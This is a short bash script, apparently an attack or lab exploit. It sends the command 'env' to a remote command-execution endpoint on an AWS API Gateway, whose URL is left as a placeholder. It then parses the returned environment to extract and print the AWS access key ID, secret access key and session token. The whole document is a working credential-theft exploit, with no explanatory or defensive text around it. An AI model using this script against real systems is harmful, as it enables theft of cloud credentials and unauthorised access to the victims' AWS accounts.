#!/bin/bash

# Send the command to the server
response=$(curl -s -X POST https://<API GOES HERE>.amazonaws.com/execute \
-H "Content-Type: application/json" \
-d '{"command":"env"}')

# Use Python to parse the JSON response and extract AWS credentials
aws_access_id=$(echo "$response" | python -c "import sys, json; print(json.load(sys.stdin)['AWS_ACCESS_ID'])")
aws_secret_access_key=$(echo "$response" | python -c "import sys, json; print(json.load(sys.stdin)['AWS_SECRET_ACCESS_KEY'])")
aws_session_token=$(echo "$response" | python -c "import sys, json; print(json.load(sys.stdin)['AWS_SESSION_TOKEN'])")

# Output the credentials
echo "AWS_ACCESS_ID: $aws_access_id"
echo "AWS_SECRET_ACCESS_KEY: $aws_secret_access_key"
echo "AWS_SESSION_TOKEN: $aws_session_token"
